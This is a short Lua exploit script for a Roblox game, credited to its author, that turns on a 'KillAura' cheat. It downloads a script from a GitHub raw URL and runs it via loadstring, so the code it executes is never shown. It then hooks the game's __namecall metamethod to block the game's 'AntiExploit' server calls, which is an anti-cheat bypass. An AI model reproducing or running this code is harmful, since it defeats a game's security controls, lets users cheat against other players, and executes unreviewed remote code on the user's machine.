-- KillAura Made By Brickmane
-- Cheerios#0447
-- Pls dont remove credit if you are trying to make a video or upload it to different script forums :(
-- or i will call saul goodman

getgenv().KillAura = true

loadstring(game:HttpGet("https://raw.githubusercontent.com/Relkss/Releases/main/FurryKiller.lua"))()


-- ANTI CHEAT BYPASS
local mt = getrawmetatable(game)
setreadonly(mt, false)
local old = mt.__namecall

mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if method == "FireServer" and self.Name == "AntiExploit" then
         return wait(9e9)
    end
    return old(self, ...)
end)